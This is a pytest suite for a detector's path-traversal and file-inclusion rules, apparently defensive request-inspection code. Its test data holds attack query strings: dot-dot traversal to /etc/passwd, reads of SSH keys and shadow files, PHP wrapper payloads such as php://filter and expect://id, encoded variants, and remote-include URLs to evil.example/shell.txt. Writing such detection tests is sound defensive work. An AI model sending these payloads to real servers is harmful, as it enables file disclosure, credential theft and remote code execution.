import time
from datetime import UTC, datetime
from ipaddress import ip_address
from uuid import uuid4

import pytest

from domain.captured_request import CapturedRequest
from workers.detector.rules import RuleRegistry
from workers.detector.traversal import RULES


def _request(
    *,
    path: str = "/",
    query: str = "",
    body: str = "",
    headers: list[tuple[str, str]] | None = None,
) -> CapturedRequest:
    return CapturedRequest(
        ts=datetime(2026, 1, 1, tzinfo=UTC),
        session_id=uuid4(),
        world_id="w",
        ip=ip_address("203.0.113.9"),
        method="GET",
        path=path,
        query=query,
        body_excerpt=body,
        headers=headers or [],
    )


@pytest.fixture(scope="module")
def registry() -> RuleRegistry:
    registry = RuleRegistry()
    for rule in RULES:
        registry.register(rule)
    return registry


def _fired(registry: RuleRegistry, request: CapturedRequest) -> set[str]:
    return {d.rule for d in registry.evaluate(request)}


# (query string, rule that must fire)
ATTACKS = [
    ("file=../../../../etc/passwd", "traversal.dotdot"),
    ("file=..\\..\\windows\\win.ini", "traversal.dotdot"),
    ("file=....//....//etc/passwd", "traversal.dotdot"),
    ("file=..;/..;/manager/html", "traversal.dotdot"),
    ("file=/etc/passwd", "traversal.sensitive_file"),
    ("file=/etc/shadow", "traversal.sensitive_file"),
    ("file=/proc/self/environ", "traversal.sensitive_file"),
    ("file=/proc/1234/cmdline", "traversal.sensitive_file"),
    ("file=/root/.ssh/id_rsa", "traversal.sensitive_file"),
    ("file=/home/deploy/.bash_history", "traversal.sensitive_file"),
    ("file=/var/log/auth.log", "traversal.sensitive_file"),
    ("file=C:\\Windows\\System32\\drivers\\etc\\hosts", "traversal.sensitive_file"),
    ("file=c:/boot.ini", "traversal.sensitive_file"),
    ("file=WEB-INF/web.xml", "traversal.sensitive_file"),
    ("file=wp-config.php.bak", "traversal.sensitive_file"),
    ("page=php://filter/convert.base64-encode/resource=index.php", "traversal.wrapper"),
    ("page=php://input", "traversal.wrapper"),
    ("page=expect://id", "traversal.wrapper"),
    ("page=phar:///tmp/x.phar/a", "traversal.wrapper"),
    ("page=data://text/plain;base64,PD9waHAgPz4=", "traversal.wrapper"),
    ("page=file:///etc/hostname", "traversal.wrapper"),
    ("page=http://evil.example/shell.txt", "traversal.remote_include"),
    ("include=https://evil.example/x.php?", "traversal.remote_include"),
    ("lang=ftp://evil.example/x", "traversal.remote_include"),
]


@pytest.mark.parametrize(("query", "rule"), ATTACKS, ids=[a[0][:50] for a in ATTACKS])
def test_attack_fires_expected_rule(registry: RuleRegistry, query: str, rule: str) -> None:
    assert rule in _fired(registry, _request(query=query))


@pytest.mark.parametrize(
    ("query", "rule"),
    [
        ("file=%2e%2e%2f%2e%2e%2fetc%2fpasswd", "traversal.dotdot"),
        ("file=%252e%252e%252fetc%252fpasswd", "traversal.dotdot"),  # double-encoded
        ("file=%2e%2e%5c%2e%2e%5cwindows%5cwin.ini", "traversal.dotdot"),  # backslashes
        ("file=%2Fetc%2Fpasswd", "traversal.sensitive_file"),
        ("file=/etc/passwd%00.png", "traversal.sensitive_file"),  # NUL suffix
        ("file=..%00/..%00/x", "traversal.dotdot"),  # NUL inside
        ("page=php%3A%2F%2Ffilter%2Fresource%3Dx", "traversal.wrapper"),
    ],
)
def test_encoded_payloads_are_still_detected(registry: RuleRegistry, query: str, rule: str) -> None:
    assert rule in _fired(registry, _request(query=query))


def test_payload_in_body_path_and_headers(registry: RuleRegistry) -> None:
    assert "traversal.dotdot" in _fired(registry, _request(path="/static/../../etc/passwd"))
    assert "traversal.sensitive_file" in _fired(registry, _request(path="/etc/passwd"))
    assert "traversal.dotdot" in _fired(registry, _request(body='{"file": "../../secret"}'))
    assert "traversal.wrapper" in _fired(
        registry, _request(body="page=php://filter/resource=index.php")
    )
    assert "traversal.dotdot" in _fired(
        registry, _request(headers=[("Referer", "http://x/?f=../../etc/passwd")])
    )


def test_detection_carries_rule_metadata_and_excerpt(registry: RuleRegistry) -> None:
    detections = registry.evaluate(_request(query="file=../../etc/passwd"))

    by_rule = {d.rule: d for d in detections}
    assert by_rule["traversal.dotdot"].matched_excerpt == "../"
    assert by_rule["traversal.dotdot"].category == "traversal"
    assert by_rule["traversal.sensitive_file"].matched_excerpt == "/etc/passwd"
    assert by_rule["traversal.sensitive_file"].severity.value == "high"


# Ordinary traffic that must stay quiet. Each looks a little like an attack.
CLEAN = [
    "q=etc passwd policy",
    "q=what is a directory",
    "q=wait... and see",
    "q=a/b and c/d",
    "path=/api/v1/products",
    "file=report.pdf",
    "file=photos/2026/beach.jpg",
    "page=2&limit=50",
    "page=about",
    "lang=en",
    "template=invoice",
    "url=https://shop.example/cart",
    "redirect=http://shop.example/",
    "callback=https://hooks.example/x",
    "q=php tutorial",
    "q=http://example.com",
    "q=windows 11 update",
    "q=config file format",
    "q=C: drive",
    "q=data text plain",
    "email=a%2Bb%40example.com",
]


@pytest.mark.parametrize("query", CLEAN)
def test_ordinary_queries_do_not_fire(registry: RuleRegistry, query: str) -> None:
    assert _fired(registry, _request(query=query)) == set()


def test_ordinary_requests_do_not_fire(registry: RuleRegistry) -> None:
    request = _request(
        path="/api/v1/products/42/images/front.jpg",
        body='{"title": "Rock & Roll", "note": "see our FAQ at https://shop.example/faq"}',
        headers=[
            ("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"),
            ("Accept", "text/html,application/xhtml+xml;q=0.9,*/*;q=0.8"),
            ("Referer", "https://shop.example/search?q=shoes&sort=price"),
            ("Cookie", "session=abc123; theme=dark"),
        ],
    )

    assert _fired(registry, request) == set()


def test_rule_set_is_consistent() -> None:
    names = [rule.name for rule in RULES]

    assert len(names) == len(set(names))
    assert all(rule.category == "traversal" for rule in RULES)
    assert all(name.startswith("traversal.") for name in names)


@pytest.mark.parametrize(
    "body",
    [
        "../" * 2700,
        ".." * 4000,
        "/etc/" + "a" * 8000,
        "/proc/" + "1" * 8000,
        "/root/" + "a" * 8000,
        "C:" + "/" * 8000,
        "file=" + " " * 8000 + "http://",
        "page" + "a" * 8000 + "=",
        "wp-config" + "." * 8000,
        "php:/" * 1600,
    ],
    ids=[
        "dotdot-spam",
        "dots",
        "etc-long",
        "proc-digits",
        "root-long",
        "drive-slashes",
        "param-spaces",
        "param-long",
        "config-dots",
        "wrapper-spam",
    ],
)
def test_adversarial_input_is_processed_quickly(registry: RuleRegistry, body: str) -> None:
    started = time.perf_counter()
    registry.evaluate(_request(body=body))

    assert time.perf_counter() - started < 0.5
